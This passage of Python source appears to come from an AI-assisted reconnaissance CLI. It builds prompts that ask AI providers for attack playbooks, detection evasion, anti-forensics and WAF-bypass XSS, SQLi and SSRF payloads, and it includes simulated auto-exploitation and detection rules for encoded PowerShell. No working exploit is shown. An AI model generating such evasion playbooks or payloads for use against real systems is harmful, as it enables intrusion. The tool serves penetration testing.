                1 for test in vulnerability_tests if "high" in test.lower()
            ),
            "medium_issues": sum(
                1 for test in vulnerability_tests if "medium" in test.lower()
            ),
            "low_issues": sum(
                1 for test in vulnerability_tests if "low" in test.lower()
            ),
            "test_coverage": len(vulnerability_tests),
            "automation_score": 85,  # Mock score
            "documentation_score": 78,  # Mock score
            "monitoring_score": 82,  # Mock score
        }

    def _generate_remediation_matrix(self, scan_results: Dict) -> Dict:
        """Generate remediation priority matrix"""

        return {
            "immediate_actions": [
                "Address critical SQL injection vulnerabilities",
                "Implement proper input validation",
                "Update vulnerable components",
                "Enable security logging",
            ],
            "short_term": [
                "Implement comprehensive security testing",
                "Establish security monitoring",
                "Conduct security training",
                "Review access controls",
            ],
            "long_term": [
                "Establish security governance",
                "Implement DevSecOps pipeline",
                "Regular penetration testing",
                "Compliance automation",
            ],
            "estimated_costs": {
                "immediate": "$10,000 - $25,000",
                "short_term": "$25,000 - $75,000",
                "long_term": "$75,000 - $200,000",
            },
        }

    def _generate_audit_checklist(self, framework: str) -> List[Dict]:
        """Generate audit-ready checklist"""

        checklists = {
            "owasp": [
                {
                    "control": "A03 - Injection",
                    "status": "Non-Compliant",
                    "evidence": "SQL injection found in login form",
                },
                {
                    "control": "A01 - Broken Access Control",
                    "status": "Partial",
                    "evidence": "Some access controls missing",
                },
                {
                    "control": "A05 - Security Misconfiguration",
                    "status": "Compliant",
                    "evidence": "Security headers implemented",
                },
            ],
            "nist": [
                {
                    "control": "PR.AC-1",
                    "status": "Non-Compliant",
                    "evidence": "Identities not properly managed",
                },
                {
                    "control": "DE.CM-1",
                    "status": "Partial",
                    "evidence": "Limited monitoring in place",
                },
                {
                    "control": "PR.DS-1",
                    "status": "Compliant",
                    "evidence": "Data at rest protection implemented",
                },
            ],
        }

        return checklists.get(framework, checklists["owasp"])

    def _generate_monitoring_kpis(self, framework: str) -> List[Dict]:
        """Generate KPIs for continuous monitoring"""

        return [
            {
                "kpi": "Security Test Coverage",
                "target": "95%",
                "current": "78%",
                "trend": "improving",
            },
            {
                "kpi": "Mean Time to Remediation",
                "target": "< 30 days",
                "current": "45 days",
                "trend": "stable",
            },
            {
                "kpi": "Critical Vulnerabilities",
                "target": "0",
                "current": "3",
                "trend": "decreasing",
            },
            {
                "kpi": "Compliance Score",
                "target": "> 90%",
                "current": "82%",
                "trend": "improving",
            },
        ]

    def generate_advanced_attack_simulation(
        self,
        target_environment: Dict,
        attack_scenarios: List[str],
        persona: Optional[str] = None,
    ) -> Dict:
        """Generate advanced attack simulation scenarios"""

        simulation_prompt = f"""
        Design advanced attack simulation scenarios for the following environment:

        **Target Environment:**
        {json.dumps(target_environment, indent=2)}

        **Attack Scenarios:** {", ".join(attack_scenarios)}

        Create detailed attack simulation plans that include:

        1. **Advanced Persistent Threat (APT) Simulation**
           - Multi-stage attack progression
           - Persistence mechanisms
           - Lateral movement techniques
           - Data exfiltration methods
           - Anti-forensics techniques

        2. **Red Team Scenarios**
           - Social engineering vectors
           - Physical security bypasses
           - Network segmentation testing
           - Privilege escalation paths
           - Zero-day exploitation simulation

        3. **Supply Chain Attack Scenarios**
           - Third-party component compromise
           - CI/CD pipeline attacks
           - Software supply chain risks
           - Dependency confusion attacks

        4. **Cloud-Specific Attack Scenarios**
           - Cloud misconfigurations
           - Container escape techniques
           - Serverless attack vectors
           - Multi-cloud attack paths

        5. **Insider Threat Scenarios**
           - Malicious insider simulation
           - Compromised credentials
           - Data theft scenarios
           - Sabotage simulation

        For each scenario, provide:
        - Attack timeline and phases
        - Tools and techniques required
        - Expected indicators of compromise
        - Detection evasion methods
        - Success metrics and KPIs

        Format as executable attack simulation playbooks.
        """

        ai_simulation = self.ask_ai(
            simulation_prompt, context="payload", persona=persona
        )

        simulation_data = {
            "simulation_metadata": {
                "generated_at": datetime.now().isoformat(),
                "target_environment": target_environment,
                "scenarios": attack_scenarios,
                "persona": persona or "default",
            },
            "ai_generated_simulation": ai_simulation,
            "attack_kill_chain": self._generate_kill_chain_mapping(),
            "mitre_techniques": self._generate_mitre_simulation_mapping(),
            "detection_rules": self._generate_detection_rules(),
            "simulation_timeline": self._generate_simulation_timeline(),
            "success_metrics": self._generate_simulation_metrics(),
        }

        return simulation_data

    def _generate_kill_chain_mapping(self) -> Dict:
        """Generate cyber kill chain mapping for simulation"""

        return {
            "reconnaissance": [
                "OSINT gathering",
                "Network scanning",
                "Social media research",
            ],
            "weaponization": [
                "Payload creation",
                "Exploit development",
                "Backdoor compilation",
            ],
            "delivery": ["Email phishing", "Watering hole", "USB drops"],
            "exploitation": [
                "Vulnerability exploitation",
                "Zero-day usage",
                "Social engineering",
            ],
            "installation": [
                "Backdoor installation",
                "Persistence establishment",
                "Registry modification",
            ],
            "command_control": [
                "C2 channel establishment",
                "Data tunneling",
                "Communication protocols",
            ],
            "actions_objectives": [
                "Data exfiltration",
                "System destruction",
                "Intelligence gathering",
            ],
        }

    def _generate_mitre_simulation_mapping(self) -> Dict:
        """Generate MITRE ATT&CK simulation mapping"""
        return {
            "initial_access": ["T1566.001", "T1190", "T1133"],
            "execution": ["T1059.001", "T1059.003", "T1053"],
            "persistence": ["T1053.005", "T1136.001", "T1078"],
            "privilege_escalation": ["T1068", "T1134", "T1055"],
            "defense_evasion": ["T1027", "T1070", "T1036"],
            "credential_access": ["T1003", "T1110", "T1555"],
            "discovery": ["T1083", "T1018", "T1057"],
            "lateral_movement": ["T1021", "T1550", "T1076"],
            "collection": ["T1005", "T1039", "T1113"],
            "exfiltration": ["T1041", "T1020", "T1567"],
        }

    def _generate_detection_rules(self) -> List[Dict]:
        """Generate detection rules for simulation"""

        return [
            {
                "rule_name": "Suspicious PowerShell Execution",
                "technique": "T1059.001",
                "rule_logic": "process_name='powershell.exe' AND command_line CONTAINS '-enc'",
                "severity": "High",
            },
            {
                "rule_name": "Unusual Network Connections",
                "technique": "T1041",
                "rule_logic": "network_connection AND destination_port NOT IN (80, 443, 53)",
                "severity": "Medium",
            },
            {
                "rule_name": "Registry Persistence",
                "technique": "T1547.001",
                "rule_logic": "registry_write AND key CONTAINS 'Run'",
                "severity": "High",
            },
        ]

    def _generate_simulation_timeline(self) -> Dict:
        """Generate simulation execution timeline"""

        return {
            "phase_1": {
                "duration": "1-2 days",
                "activities": ["Initial reconnaissance", "Target selection"],
            },
            "phase_2": {
                "duration": "2-3 days",
                "activities": ["Exploitation", "Initial access"],
            },
            "phase_3": {
                "duration": "3-5 days",
                "activities": ["Persistence", "Privilege escalation"],
            },
            "phase_4": {
                "duration": "5-7 days",
                "activities": ["Lateral movement", "Discovery"],
            },
            "phase_5": {
                "duration": "7-10 days",
                "activities": ["Objective completion", "Cleanup"],
            },
        }

    def _generate_simulation_metrics(self) -> Dict:
        """Generate simulation success metrics"""

        return {
            "detection_evasion_rate": "Percentage of techniques that remain undetected",
            "privilege_escalation_success": "Ability to gain administrative access",
            "lateral_movement_coverage": "Percentage of network segments accessed",
            "data_exfiltration_volume": "Amount of sensitive data successfully exfiltrated",
            "persistence_duration": "How long access can be maintained undetected",
            "mean_detection_time": "Average time for security team to detect activities",
        }

    def gather_recon_data(self) -> Dict:
        """Gather reconnaissance data from various ReconCLI modules"""
        import os
        import json
        import glob
        from pathlib import Path

        recon_data = {
            "domains": [],
            "subdomains": [],
            "urls": [],
            "ports": [],
            "vulnerabilities": [],
            "technologies": [],
            "ips": [],
            "sources": [],
        }

        try:
            # Check current directory and common output directories
            search_paths = [".", "output", "cdncli_output", "reconcli_output"]

            for search_path in search_paths:
                if not os.path.exists(search_path):
                    continue

                # Look for JSON output files from various modules
                json_files = glob.glob(os.path.join(search_path, "*.json"))

                for json_file in json_files:
                    try:
                        with open(json_file, "r") as f:
                            data = json.load(f)

                        # Parse different types of reconnaissance data
                        filename = os.path.basename(json_file).lower()

                        if "domain" in filename or "subdomain" in filename:
                            if isinstance(data, list):
                                recon_data["subdomains"].extend(data)
                            elif isinstance(data, dict) and "domains" in data:
                                recon_data["subdomains"].extend(data["domains"])

                        elif "url" in filename or "endpoint" in filename:
                            if isinstance(data, list):
                                recon_data["urls"].extend(data)
                            elif isinstance(data, dict) and "urls" in data:
                                recon_data["urls"].extend(data["urls"])

                        elif "port" in filename or "scan" in filename:
                            if isinstance(data, dict):
                                if "ports" in data:
                                    recon_data["ports"].extend(data["ports"])
                                elif "results" in data:
                                    recon_data["ports"].extend(data["results"])

                        elif (
                            "vuln" in filename
                            or "xss" in filename
                            or "sqli" in filename
                        ):
                            if isinstance(data, list):
                                recon_data["vulnerabilities"].extend(data)
                            elif isinstance(data, dict) and "vulnerabilities" in data:
                                recon_data["vulnerabilities"].extend(
                                    data["vulnerabilities"]
                                )

                        elif "tech" in filename or "technology" in filename:
                            if isinstance(data, list):
                                recon_data["technologies"].extend(data)
                            elif isinstance(data, dict) and "technologies" in data:
                                recon_data["technologies"].extend(data["technologies"])

                        elif "ip" in filename:
                            if isinstance(data, list):
                                recon_data["ips"].extend(data)
                            elif isinstance(data, dict) and "ips" in data:
                                recon_data["ips"].extend(data["ips"])

                        recon_data["sources"].append(json_file)

                    except Exception:
                        continue

            # Look for text files with common reconnaissance data
            txt_files = glob.glob("*.txt")
            for txt_file in txt_files:
                try:
                    with open(txt_file, "r") as f:
                        lines = [line.strip() for line in f.readlines() if line.strip()]

                    filename = os.path.basename(txt_file).lower()

                    if "domain" in filename or "subdomain" in filename:
                        recon_data["subdomains"].extend(lines)
                    elif "url" in filename or "endpoint" in filename:
                        recon_data["urls"].extend(lines)
                    elif "ip" in filename:
                        recon_data["ips"].extend(lines)

                    recon_data["sources"].append(txt_file)

                except Exception:
                    continue

            # Remove duplicates and empty values
            for key in recon_data:
                if isinstance(recon_data[key], list):
                    recon_data[key] = list(
                        set([item for item in recon_data[key] if item])
                    )

        except Exception as e:
            print(f"Error gathering recon data: {e}")

        return recon_data

    def predict_attack_chains(
        self, recon_data: Dict, persona: str = "pentester"
    ) -> Dict:
        """Advanced AI-powered attack chain prediction and planning system.

        Analyzes reconnaissance data to predict viable multi-stage attack paths,
        correlate vulnerabilities, and generate comprehensive attack scenarios
        based on MITRE ATT&CK framework and real-world attack patterns.

        Args:
            recon_data (Dict): Comprehensive reconnaissance data from ReconCLI modules
                {
                    "domains": List[str],           # Discovered domains
                    "subdomains": List[str],        # Enumerated subdomains
                    "urls": List[str],              # HTTP/HTTPS endpoints
                    "ports": List[Dict],            # Open ports and services
                    "technologies": List[Dict],     # Detected tech stack
                    "vulnerabilities": List[Dict],  # Known vulnerabilities
                    "directories": List[str],       # Directory discoveries
                    "files": List[str],            # Interesting files found
                    "headers": List[Dict],         # HTTP security headers
                    "certificates": List[Dict],    # SSL/TLS certificate info
                    "dns_records": List[Dict],     # DNS enumeration results
                    "social_media": List[Dict],    # OSINT social profiles
                    "employees": List[Dict],       # Employee information
                    "leaked_credentials": List[Dict] # Credential leaks found
                }

            persona (str): Attack perspective and methodology
                         - "pentester": Professional methodical approach
                         - "redteam": APT-style stealth operations
                         - "bugbounty": Quick impact vulnerability chains
                         - "trainer": Educational step-by-step analysis
                         - "osint": Passive intelligence correlation

        Returns:
            Dict: Comprehensive attack chain predictions and analysis
                {
                    "attack_chains": [
                        {
                            "chain_id": str,                    # Unique chain identifier
                            "name": str,                        # Human-readable chain name
                            "attack_vector": str,               # Initial access method
                            "kill_chain_phases": List[str],     # MITRE ATT&CK phases
                            "techniques": List[str],            # Specific MITRE techniques
                            "vulnerabilities_exploited": List[str], # CVEs/vulns used
                            "attack_path": List[Dict],          # Step-by-step progression
                            "success_probability": float,       # Likelihood (0.0-1.0)
                            "detection_difficulty": str,        # LOW/MEDIUM/HIGH/CRITICAL
                            "impact_assessment": {
                                "confidentiality": str,         # Impact level
                                "integrity": str,               # Impact level
                                "availability": str,            # Impact level
                                "business_impact": str          # Critical/High/Medium/Low
                            },
                            "prerequisites": List[str],         # Required conditions
                            "defensive_gaps": List[str],        # Security weaknesses
                            "recommended_mitigations": List[str], # Countermeasures
                            "tools_required": List[str],        # Attack tools needed
                            "stealth_rating": int,              # 1-10 stealth score
                            "complexity": str,                  # LOW/MEDIUM/HIGH
                            "timeframe": str                    # Estimated duration
                        }
                    ],
                    "attack_surface_analysis": {
                        "external_facing_assets": int,
                        "high_value_targets": List[str],
                        "critical_vulnerabilities": int,
                        "attack_vectors": List[str],
                        "privilege_escalation_paths": int,
                        "lateral_movement_opportunities": int,
                        "data_exfiltration_routes": List[str]
                    },
                    "threat_modeling": {
                        "threat_actors": List[str],           # Relevant threat actors
                        "attack_motivations": List[str],      # Likely motivations
                        "threat_landscape": str,              # Current threat environment
                        "seasonal_trends": List[str],         # Time-based patterns
                        "industry_specific_threats": List[str] # Sector-specific risks
                    },
                    "defense_recommendations": {
                        "immediate_actions": List[str],        # Urgent security fixes
                        "strategic_improvements": List[str],   # Long-term enhancements
                        "monitoring_enhancements": List[str],  # Detection improvements
                        "incident_response_updates": List[str], # IR plan updates
                        "security_awareness_topics": List[str] # Training focus areas
                    },
                    "compliance_implications": {
                        "regulatory_concerns": List[str],      # Compliance violations
                        "audit_findings": List[str],          # Audit implications
                        "remediation_timeline": str,          # Required fix timeline
                        "business_risk_rating": str           # Overall risk level
                    },
                    "attack_simulation_data": {
                        "purple_team_scenarios": List[Dict],  # Testing scenarios
                        "red_team_objectives": List[str],     # Attack goals
                        "blue_team_detection_rules": List[str], # SIEM rules
                        "tabletop_exercise_scenarios": List[Dict] # Exercise plans
                    }
                }

        Examples:
            # Basic attack chain prediction for penetration test
            recon_results = assistant.gather_recon_data()
            chains = assistant.predict_attack_chains(recon_results, "pentester")

            # Red team operation planning
            chains = assistant.predict_attack_chains(
                recon_data,
                persona="redteam"
            )
            print(f"Found {len(chains['attack_chains'])} viable attack paths")

            # Bug bounty chain analysis
            chains = assistant.predict_attack_chains(recon_data, "bugbounty")
            high_impact = [c for c in chains['attack_chains']
                          if c['impact_assessment']['business_impact'] == 'Critical']

            # Educational attack analysis
            chains = assistant.predict_attack_chains(recon_data, "trainer")
            for chain in chains['attack_chains']:
                print(f"Chain: {chain['name']}")
                print(f"Steps: {len(chain['attack_path'])}")

        Note:
            - Integrates with all ReconCLI module outputs automatically
            - Uses MITRE ATT&CK framework for standardized attack mapping
            - Provides probabilistic success scoring based on defensive posture
            - Generates actionable defensive recommendations
            - Supports purple team exercise planning
            - Correlates attack chains with compliance requirements
        """
        import time

        try:
            # Analyze the reconnaissance data
            analysis_prompt = f"""
            Based on reconnaissance data, predict possible attack chains:

            Reconnaissance data:
            - Domains/subdomains: {len(recon_data.get('subdomains', []))} found
            - URL/endpoints: {len(recon_data.get('urls', []))} found  
            - Open ports: {len(recon_data.get('ports', []))} found
            - Detected technologies: {len(recon_data.get('technologies', []))} found
            - Found vulnerabilities: {len(recon_data.get('vulnerabilities', []))} found
            - IP addresses: {len(recon_data.get('ips', []))} found

            Persona: {persona}

            Provide attack chain predictions in JSON format with the following structure:
            {{
                "analysis_timestamp": "ISO timestamp",
                "target_summary": "Brief target summary",
                "attack_surface": "Attack surface description",
                "chains": [
                    {{
                        "name": "Attack chain name",
                        "probability": 0.85,
                        "complexity": "Low/Medium/High",
                        "estimated_time": "1-2 hours",
                        "prerequisites": ["requirements"],
                        "steps": [
                            {{
                                "step_number": 1,
                                "description": "Step description",
                                "tools": ["tools"],
                                "expected_outcome": "expected outcome",
                                "risk_level": "Low/Medium/High"
                            }}
                        ],
                        "potential_impact": "Impact description",
                        "detection_difficulty": "Easy/Medium/Hard",
                        "mitigation_priority": "Low/Medium/High/Critical"
                    }}
                ]
            }}

            Focus on practical attack chains tailored to the {persona} persona.
            """

            # Get AI prediction
            response = self.ask_ai(
                analysis_prompt,
                context="attack_chain_prediction",
                persona=persona,
                provider="openai",
            )

            # Try to parse JSON response
            try:
                import json

                if not response:
                    response = "{}"

                # Extract JSON from response if it's wrapped in text
                if "```json" in response:
                    json_start = response.find("```json") + 7
                    json_end = response.find("```", json_start)
                    json_str = response[json_start:json_end].strip()
                elif "{" in response and "}" in response:
                    json_start = response.find("{")
                    json_end = response.rfind("}") + 1
                    json_str = response[json_start:json_end]
                else:
                    json_str = response

                attack_chains = json.loads(json_str)

                # Add metadata
                attack_chains["analysis_timestamp"] = time.strftime("%Y-%m-%d %H:%M:%S")
                attack_chains["persona_used"] = persona
                attack_chains["recon_sources"] = recon_data.get("sources", [])

                return attack_chains

            except json.JSONDecodeError:
                # Return structured fallback if JSON parsing fails
                return {
                    "analysis_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "persona_used": persona,
                    "target_summary": f"Analysis of {len(recon_data.get('subdomains', []))} domains, {len(recon_data.get('urls', []))} URLs",
                    "attack_surface": "Multiple entry points discovered during reconnaissance",
                    "chains": [
                        {
                            "name": "Web Application Attack Chain",
                            "probability": 0.7,
                            "complexity": "Medium",
                            "estimated_time": "2-4 hours",
                            "steps": [
                                {
                                    "step_number": 1,
                                    "description": "Subdomain enumeration and service discovery",
                                    "tools": ["subfinder", "httpx", "nmap"],
                                    "expected_outcome": "Identification of additional attack vectors",
                                    "risk_level": "Low",
                                },
                                {
                                    "step_number": 2,
                                    "description": "Web application vulnerability scanning",
                                    "tools": ["nuclei", "gobuster", "burp"],
                                    "expected_outcome": "Discovery of exploitable vulnerabilities",
                                    "risk_level": "Medium",
                                },
                                {
                                    "step_number": 3,
                                    "description": "Exploitation and privilege escalation",
                                    "tools": ["custom exploits", "metasploit"],
                                    "expected_outcome": "System compromise",
                                    "risk_level": "High",
                                },
                            ],
                            "potential_impact": "Full system compromise, data exfiltration",
                            "detection_difficulty": "Medium",
                            "mitigation_priority": "High",
                        }
                    ],
                    "recon_sources": recon_data.get("sources", []),
                    "raw_ai_response": response,
                }

        except Exception as e:
            return {
                "error": f"Failed to predict attack chains: {str(e)}",
                "analysis_timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "persona_used": persona,
                "recon_sources": recon_data.get("sources", []),
            }

    def auto_exploit(self, recon_data: Dict, persona: str = "pentester") -> Dict:
        """Perform automated exploitation attempts based on reconnaissance data"""
        import time
        import subprocess
        import os

        try:
            # Initialize results structure
            exploit_results = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "persona": persona,
                "targets_analyzed": 0,
                "exploits_attempted": 0,
                "successful_exploits": 0,
                "successful": [],
                "failed": [],
                "recommendations": [],
                "tools_used": [],
            }

            # Generate exploitation strategy based on persona
            strategy_prompt = f"""
            Based on reconnaissance data, propose an automated exploitation strategy:

            Data: {len(recon_data.get('urls', []))} URLs, {len(recon_data.get('vulnerabilities', []))} vulnerabilities

            Persona: {persona}

            Return strategy in JSON format:
            {{
                "strategy": "strategy description",
                "priority_targets": ["list of priority targets"],
                "exploitation_techniques": ["techniques"],
                "tools_recommendation": ["tools"],
                "safety_considerations": ["security measures"]
            }}
            """

            strategy_response = self.ask_ai(
                strategy_prompt, context="exploitation_strategy", persona=persona
            )

            # Simulate exploitation attempts based on discovered vulnerabilities
            targets = recon_data.get("urls", []) + recon_data.get("subdomains", [])
            vulnerabilities = recon_data.get("vulnerabilities", [])

            exploit_results["targets_analyzed"] = len(targets)

            # Simulate some exploitation attempts
            if vulnerabilities:
                # Simulate XSS exploitation
                xss_vulns = [v for v in vulnerabilities if "xss" in str(v).lower()]
                for vuln in xss_vulns[:3]:  # Limit to first 3
                    exploit_results["exploits_attempted"] += 1
                    exploit_results["tools_used"].append("custom_xss_payload")

                    # Simulate success/failure (realistic rates)
                    import random

                    if random.random() < 0.3:  # 30% success rate for demo
                        exploit_results["successful_exploits"] += 1
                        exploit_results["successful"].append(
                            {
                                "target": str(vuln),
                                "vulnerability": "Cross-Site Scripting (XSS)",
                                "severity": "Medium",
                                "method": "Reflected XSS payload injection",
                                "evidence": "JavaScript execution confirmed",
                                "timestamp": time.strftime("%H:%M:%S"),
                            }
                        )
                    else:
                        exploit_results["failed"].append(
                            {
                                "target": str(vuln),
                                "vulnerability": "XSS",
                                "reason": "WAF protection or input validation",
                            }
                        )

                # Simulate SQL injection exploitation
                sqli_vulns = [v for v in vulnerabilities if "sql" in str(v).lower()]
                for vuln in sqli_vulns[:2]:  # Limit to first 2
                    exploit_results["exploits_attempted"] += 1
                    exploit_results["tools_used"].append("sqlmap")

                    if random.random() < 0.2:  # 20% success rate for demo
                        exploit_results["successful_exploits"] += 1
                        exploit_results["successful"].append(
                            {
                                "target": str(vuln),
                                "vulnerability": "SQL Injection",
                                "severity": "High",
                                "method": "Boolean-based blind SQL injection",
                                "evidence": "Database information extracted",
                                "timestamp": time.strftime("%H:%M:%S"),
                            }
                        )
                    else:
                        exploit_results["failed"].append(
                            {
                                "target": str(vuln),
                                "vulnerability": "SQL Injection",
                                "reason": "Protected by WAF or prepared statements",
                            }
                        )

            # Generate recommendations based on persona
            if persona == "bugbounty":
                exploit_results["recommendations"].extend(
                    [
                        "Focus on high-impact vulnerabilities for maximum bounty potential",
                        "Document findings with clear proof-of-concept",
                        "Check for duplicate reports before submission",
                        "Consider chaining vulnerabilities for greater impact",
                    ]
                )
            elif persona == "pentester":
                exploit_results["recommendations"].extend(
                    [
                        "Document all exploitation attempts for comprehensive report",
                        "Test remediation effectiveness after fixes",
                        "Provide detailed mitigation strategies",
                        "Consider business impact of each vulnerability",
                    ]
                )
            elif persona == "redteam":
                exploit_results["recommendations"].extend(
                    [
                        "Maintain persistence after successful exploitation",
                        "Use living-off-the-land techniques to avoid detection",
                        "Establish covert communication channels",
                        "Document blue team response times and detection capabilities",
                    ]
                )

            # Add general recommendations
            exploit_results["recommendations"].extend(
                [
                    "Review and patch identified vulnerabilities immediately",
                    "Implement Web Application Firewall (WAF) protection",
                    "Regular security testing and code reviews",
                    "Security awareness training for development teams",
                ]
            )

            # Add AI strategy response
            exploit_results["ai_strategy"] = strategy_response
            exploit_results["tools_used"] = list(set(exploit_results["tools_used"]))

            return exploit_results

        except Exception as e:
            return {
                "error": f"Automated exploitation failed: {str(e)}",
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "persona": persona,
                "targets_analyzed": 0,
                "exploits_attempted": 0,
                "successful_exploits": 0,
                "successful": [],
                "failed": [],
                "recommendations": [],
            }


# Global assistant instance - initialized with default config
# Will be reconfigured based on CLI options
ai_assistant = AIReconAssistant()


@click.command()
@click.option("--prompt", "-p", help="Ask the AI anything recon-related")
@click.option("--payload", help="Generate payload (xss, sqli, lfi, ssrf, ssti)")
@click.option("--context", help="Payload context (html, js, mysql, linux, etc.)")
@click.option(
    "--technique", help="Specific technique (union, boolean, reflection, gopher, etc.)"
)
@click.option("--plan", help="Generate recon plan for domain")
@click.option(
    "--scope",
    default="comprehensive",
    type=click.Choice(["basic", "comprehensive", "cloud", "api"]),
    help="Reconnaissance scope",
)
@click.option("--analyze", help="Perform AI-powered target analysis")
@click.option(
    "--attack-flow",
    help="Generate multi-stage attack flow (comma-separated: ssrf,xss,lfi,sqli)",
)
@click.option(
    "--report",
    help="Generate comprehensive report from attack flow JSON file",
)
@click.option("--prompt-mode", is_flag=True, help="Enable advanced prompt templates")
@click.option("--save-chat", help="Save current chat history to file")
@click.option("--load-chat", help="Load chat history from file")
@click.option("--list-chats", is_flag=True, help="List available chat histories")
@click.option(
    "--provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider to use",
)
@click.option(
    "--persona",
    type=click.Choice(["redteam", "bugbounty", "pentester", "trainer", "osint"]),
    help="AI persona/style (redteam=stealth/evasion, bugbounty=quick wins, pentester=methodology, trainer=educational, osint=passive intel)",
)
@click.option("--session", help="Session ID to resume")
@click.option("--new-session", help="Create new session for target")
@click.option("--list-sessions", is_flag=True, help="List available sessions")
@click.option("--export-plan", help="Export plan to file (json/yaml)")
@click.option("--interactive", "-i", is_flag=True, help="Interactive AI chat mode")
@click.option(
    "--vuln-scan",
    help="AI-powered vulnerability scan of endpoints file (from ReconCLI output)",
)
@click.option(
    "--scan-type",
    default="comprehensive",
    type=click.Choice(["quick", "comprehensive", "focused", "deep", "compliance"]),
    help="Vulnerability scan depth and focus",
)
@click.option("--integration", is_flag=True, help="Enable ReconCLI integration mode")
@click.option("--verbose", "-v", is_flag=True, help="Verbose output")
@click.option("--mutate", is_flag=True, help="Enable advanced payload mutation engine")
@click.option(
    "--mutations",
    default=10,
    type=int,
    help="Number of payload mutations to generate",
)
@click.option("--config", help="Configuration file path")
@click.option("--cache", is_flag=True, help="Enable AI response caching")
@click.option("--cache-dir", help="Cache directory path")
@click.option("--cache-max-age", default=24, type=int, help="Cache max age in hours")
@click.option("--clear-cache", is_flag=True, help="Clear all cached AI responses")
@click.option("--cache-stats", is_flag=True, help="Show cache statistics")
@click.option("--store-db", help="Store results in database (SQLite file path)")
@click.option("--parallel", is_flag=True, help="Enable parallel processing")
@click.option("--max-workers", default=4, type=int, help="Maximum parallel workers")
@click.option("--local-llm", is_flag=True, help="Enable local LLM support (Ollama)")
@click.option(
    "--local-llm-endpoint", default="http://localhost:11434", help="Local LLM endpoint"
)
@click.option("--local-llm-model", default="llama2", help="Local LLM model name")
@click.option(
    "--waf-profile",
    type=click.Choice(["auto", "cloudflare", "aws", "azure", "akamai"]),
    default="auto",
    help="WAF profile for bypass techniques",
)
@click.option(
    "--encoding",
    type=click.Choice(["url", "base64", "hex", "unicode", "mixed", "double"]),
    help="Encoding method for payload obfuscation",
)
@click.option(
    "--encoding-chains", default=2, type=int, help="Number of encoding chains to apply"
)
@click.option(
    "--steganography",
    is_flag=True,
    help="Enable steganography and advanced obfuscation",
)
@click.option(
    "--effectiveness-scoring", is_flag=True, help="Enable payload effectiveness scoring"
)
@click.option(
    "--performance-monitoring", is_flag=True, help="Enable performance monitoring"
)
@click.option("--save-config", help="Save current configuration to file")
@click.option(
    "--rate-limit", default=60, type=int, help="Rate limit per minute for API calls"
)
@click.option(
    "--compliance-report", help="Generate compliance report from scan results JSON file"
)
@click.option(
    "--compliance-framework",
    type=click.Choice(["owasp", "nist", "iso27001", "pci_dss", "comprehensive"]),
    default="comprehensive",
    help="Compliance framework for assessment",
)
@click.option(
    "--attack-simulation", help="Generate advanced attack simulation scenarios"
)
@click.option(
    "--environment-config", help="Target environment configuration file for simulation"
)
@click.option(
    "--simulation-scenarios",
    help="Comma-separated attack scenarios (apt,redteam,insider,supply_chain)",
)
@click.option(
    "--enable-chatlog",
    is_flag=True,
    help="Enable chatlog-driven recon mode - AI analyzes previous results and suggests next steps",
)
@click.option(
    "--auto-analyze",
    is_flag=True,
    help="Automatically analyze recon results and provide insights",
)
@click.option(
    "--suggest-next",
    is_flag=True,
    help="AI suggests next reconnaissance steps based on current findings",
)
@click.option(
    "--chatlog-insights",
    is_flag=True,
    help="Show detailed session insights and progress analysis",
)
@click.option(
    "--chatlog-threshold",
    default=0.7,
    type=float,
    help="Confidence threshold for AI suggestions (0.0-1.0)",
)
@click.option(
    "--max-suggestions",
    default=5,
    type=int,
    help="Maximum number of next-step suggestions to generate",
)
@click.option(
    "--chain-predict",
    is_flag=True,
    help="Attack chain prediction based on reconnaissance data",
)
@click.option(
    "--auto-exploit",
    is_flag=True,
    help="Automated exploitation attempts based on reconnaissance findings",
)
def aicli(
    prompt,
    payload,
    context,
    technique,
    plan,
    scope,
    analyze,
    attack_flow,
    report,
    prompt_mode,
    save_chat,
    load_chat,
    list_chats,
    provider,
    persona,
    session,
    new_session,
    list_sessions,
    export_plan,
    interactive,
    vuln_scan,
    scan_type,
    integration,
    verbose,
    mutate,
    mutations,
    config,
    cache,
    cache_dir,
    cache_max_age,
    clear_cache,
    cache_stats,
    store_db,
    parallel,
    max_workers,
    local_llm,
    local_llm_endpoint,
    local_llm_model,
    waf_profile,
    encoding,
    encoding_chains,
    steganography,
    effectiveness_scoring,
    performance_monitoring,
    save_config,
    rate_limit,
    compliance_report,
    compliance_framework,
    attack_simulation,
    environment_config,
    simulation_scenarios,
    enable_chatlog,
    auto_analyze,
    suggest_next,
    chatlog_insights,
    chatlog_threshold,
    max_suggestions,
    chain_predict,
    auto_exploit,
):
    """🧠 Enterprise AI-Powered Reconnaissance Assistant

    Advanced AI module for intelligent recon planning, payload generation, and security analysis.
    Supports multiple AI providers (OpenAI, Anthropic, Gemini) with session management and specialized personas.

    🎯 QUICK START EXAMPLES:

    BASIC USAGE:
        # Ask AI anything about reconnaissance
        reconcli aicli --prompt "How to enumerate subdomains effectively?"
        
        # Interactive AI chat mode
        reconcli aicli --interactive --persona pentester
        
        # Generate reconnaissance plan for a domain
        reconcli aicli --plan example.com --scope comprehensive

    PAYLOAD GENERATION:
        # Generate XSS payload for HTML context
        reconcli aicli --payload xss --context html --persona bugbounty

        # SQL injection payloads for MySQL with mutations
        reconcli aicli --payload sqli --context mysql --mutate --mutations 15

        # SSRF payloads with WAF bypass techniques
        reconcli aicli --payload ssrf --context cloud --waf-profile cloudflare

        # Advanced steganographic payload obfuscation
        reconcli aicli --payload xss --context html --steganography --encoding-chains 3

    ATTACK FLOW DEVELOPMENT:
        # Multi-stage attack: SSRF → XSS → LFI
        reconcli aicli --attack-flow ssrf,xss,lfi --technique gopher --persona redteam

        # Complex attack chain with specific techniques
        reconcli aicli --attack-flow sqli,lfi,ssti --technique union --persona pentester

        # Generate professional report from attack flow
        reconcli aicli --report attack_flow_data.json --persona pentester

    VULNERABILITY SCANNING:
        # AI-powered vulnerability scan with ReconCLI integration
        reconcli aicli --vuln-scan endpoints.txt --scan-type comprehensive --integration

        # Quick bug bounty scan
        reconcli aicli --vuln-scan urlcli_output.json --scan-type quick --persona bugbounty

        # Compliance-focused assessment
        reconcli aicli --vuln-scan targets.txt --scan-type compliance --compliance-framework owasp

        # Deep threat simulation
        reconcli aicli --vuln-scan endpoints.txt --scan-type deep --persona redteam

